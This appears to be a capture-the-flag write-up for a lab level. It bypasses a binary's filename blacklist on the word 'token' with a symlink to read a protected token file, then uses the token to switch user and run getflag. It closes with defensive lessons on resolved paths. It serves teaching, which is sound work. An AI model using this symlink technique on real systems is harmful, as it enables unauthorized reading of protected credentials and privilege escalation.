
---
### 🔎 Challenge Summary

> This level includes a binary that restricts users from accessing any file whose name contains the word `"token"`.  
> The goal is to **bypass this naive blacklist** and read the restricted file anyway.

**Login:** `level04 : level04`  
**Target file:** `/home/flag04/token`  
**Binary:** `/home/flag04/flag04`

---

### 🧬 Source Code Analysis

```c
if(strstr(argv[1], "token") != NULL) {
    printf("You may not access '%s'\n", argv[1]);
    exit(EXIT_FAILURE);
}
```

🚨 **Issue:**  
The program checks the **filename string**, not the actual file contents or file path once resolved.  
That means symbolic links or hard links can bypass this check.

---

### 🎯 Goal

Trick the program into reading the contents of the `token` file **without using the word `token` in the argument**.

---

### 🛠️ Exploitation Process

#### 🪝 Step 1: Create a symlink

```bash
ln -s /home/flag04/token /tmp/sneaky
```

This creates a symbolic link named `/tmp/sneaky` pointing to the real `token` file.

#### ⚙️ Step 2: Run the binary using the symlink

```bash
cd /home/flag04
./flag04 /tmp/sneaky
```

✅ Output:

```
06508b5e-x-x-x-x
```

You've successfully read the restricted file.

---

### 🔓 Step 3: Use the token

Now that you have the token, you can proceed as the next user (if required):

```bash
su flag04
Password: [paste token]
getflag
```

✅ Output:

```
You have successfully executed getflag on a target account
```

---

### 📘 Lessons Learned

This challenge highlights how **blacklist-based security** — especially when applied to **string comparisons on filenames** — is fundamentally weak.

🧠 **Key Takeaway:**

> Don’t trust input string checks when dealing with file access control. Use resolved paths or permission-based checks (e.g., `realpath()`, inode comparisons) instead.

---
	